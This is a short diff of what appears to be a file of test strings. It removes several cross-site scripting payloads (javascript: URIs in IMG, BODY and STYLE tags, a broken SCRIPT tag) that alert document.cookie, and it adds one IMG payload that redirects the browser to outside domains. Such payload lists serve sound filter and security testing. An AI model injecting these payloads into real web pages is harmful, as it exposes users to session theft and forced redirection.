@@ -1,12 +1,6 @@
 imvieira
 imvieiravovobina
-<IMG SRC="javascript:alert(document.cookie);">
-<<SCRIPT>alert("document.cookie");//\<</SCRIPT>
-\";alert('document.cookie');//
-<BODY BACKGROUND="javascript:alert('document.cookie')">
-<STYLE type="text/css">BODY{background:url("javascript:alert('document.cookie')")}</STYLE>
-
-<STYLE type="text/css">BODY{background:url("<javascript:alert>('document.cookie')")}</STYLE>
+<IMG SRC="javascript:alert(document.location="https://google.com",document.location="https://www.zerod.com");">
 
 novaslinhas
 novaslinhas
